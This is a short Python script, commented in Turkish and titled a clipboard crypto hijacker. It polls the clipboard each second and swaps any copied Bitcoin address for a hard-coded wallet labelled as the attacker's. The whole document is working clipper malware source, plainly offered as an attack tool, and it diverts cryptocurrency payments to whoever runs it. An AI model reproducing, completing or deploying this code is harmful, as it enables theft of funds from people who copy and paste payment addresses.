import pyperclip
import time
import re

print("--- CLIPBOARD CRYPTO HIJACKER ---")
print("Pano izleniyor... (Kripto adresi kopyalandığında devreye girer)")

# Senin cüzdanın (Saldırgan)
MY_BTC_WALLET = "1HaCkErWaLLeT_AdReSs_Xu7"

# Bitcoin Adresi Regex (1 veya 3 ile başlayan 26-35 karakter)
btc_pattern = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')

while True:
    try:
        # Panodaki veriyi al
        clipboard_content = pyperclip.paste()
        
        # Eğer kopyalanan şey bir BTC adresi ise VE bizimki değilse
        if btc_pattern.match(clipboard_content) and clipboard_content != MY_BTC_WALLET:
            print(f"💰 HEDEF TESPİT EDİLDİ: {clipboard_content}")
            
            # Panoyu değiştir!
            pyperclip.copy(MY_BTC_WALLET)
            print(f"♻️ DEĞİŞTİRİLDİ -> {MY_BTC_WALLET}")
            
        time.sleep(1)
    except:
        pass